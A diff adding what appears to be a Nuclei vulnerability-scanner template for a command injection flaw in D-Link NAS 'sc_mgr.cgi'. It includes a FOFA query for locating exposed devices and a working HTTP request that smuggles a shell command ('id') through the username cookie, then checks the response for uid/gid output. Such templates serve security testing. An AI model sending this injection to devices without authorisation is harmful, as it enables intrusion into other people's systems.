@@ -1,0 +1,36 @@
+id: dlink-nas-rce
+
+info:
+  name: D-Link NAS `sc_mgr.cgi` - Remote Code Execution
+  author: adeljck
+  severity: critical
+  description: |
+    The D-Link NAS interface sc_mgr.cgi contains a command execution vulnerability that allows attackers to execute arbitrary commands on the device, potentially leading to unauthorized access or control over the system.
+  remediation: |
+    To remediate this vulnerability, ensure that the device firmware is updated to the latest version provided by the manufacturer. Additionally, consider implementing network segmentation and firewall rules to restrict unauthorized access to the device.
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: 'body="/cgi-bin/login_mgr.cgi" && body="cmd=cgi_get_ssl_info"'
+  tags: dlink,nas,rce
+
+http:
+  - raw:
+      - |
+        GET /cgi-bin/sc_mgr.cgi?cmd=SC_Get_Info HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: username='& id &';
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)"
+          - "404 not found"
+        condition: and
+
+      - type: status
+        status:
+          - 200
+# digest: 4b0a004830460221009672369aef99c75323a8c1eef0fc41702b10683e4dace1eafe5f75dc9caaac6d022100d22b0b46c796ce9df17025484e6c69f9160c07f59a801125c3d397cf9eb8be2f:922c64590222798bb761d5b6d8e72950
